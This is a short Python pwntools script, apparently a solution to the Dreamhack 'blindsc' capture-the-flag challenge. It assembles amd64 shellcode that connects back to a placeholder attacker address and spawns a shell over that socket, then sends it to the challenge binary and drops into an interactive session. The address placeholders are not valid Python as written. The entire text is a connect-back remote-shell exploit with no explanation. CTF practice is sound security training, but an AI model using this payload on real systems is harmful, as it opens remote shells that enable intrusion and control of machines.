from pwn import *

#p = remote("host3.dreamhack.games", 8622)
p = process("./blindsc")
context(arch="amd64", os="linux")

shellcode = shellcraft.connect('was.my.ip', was.my.port)
shellcode += shellcraft.findpeersh(was.my.port)

p.sendafter(b"shellcode: ", asm(shellcode))
p.interactive()
